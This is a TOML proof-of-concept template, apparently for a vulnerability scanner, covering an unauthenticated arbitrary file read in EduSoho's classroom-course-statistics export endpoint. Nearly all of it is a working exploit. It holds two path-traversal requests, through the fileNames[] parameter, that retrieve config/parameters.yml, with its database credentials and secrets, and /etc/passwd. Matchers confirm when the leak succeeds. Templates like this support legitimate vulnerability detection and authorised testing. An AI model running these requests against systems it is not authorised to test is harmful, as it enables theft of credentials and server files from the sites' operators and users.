[info]
id = "POC-AVE-2026-0066"
name = "EduSoho 教培系统任意文件读取漏洞 PoC"
author = "AVE"
severity = "high"
tags = ["lfi", "path-traversal", "information-disclosure", "edusoho"]
description = "EduSoho 教培系统 v22.4.7 以下版本 classroom-course-statistics 导出接口存在未授权任意文件读取漏洞，攻击者可读取 config/parameters.yml 等敏感配置文件。"
vuln_id = ["CVE-2023-7335", "CNVD-2023-03903", "AVE-2026-0066"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/export/classroom-course-statistics"

query.fileNames[] = "../../../config/parameters.yml"

headers.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
headers.Connection = "close"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "content_type"
words = ["text/csv"]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["parameters", "secret", "database_host", "database_user"]
expect = true

[[poc.requests]]
method = "GET"
path = "/export/classroom-course-statistics"

query.fileNames[] = "../../../../../../../etc/passwd"

headers.Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
headers.Connection = "close"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "content_type"
words = ["text/csv"]
expect = true

[[poc.requests.matchers]]
type = "regex"
part = "body"
regex = ["root:.*:0:0:"]
expect = true
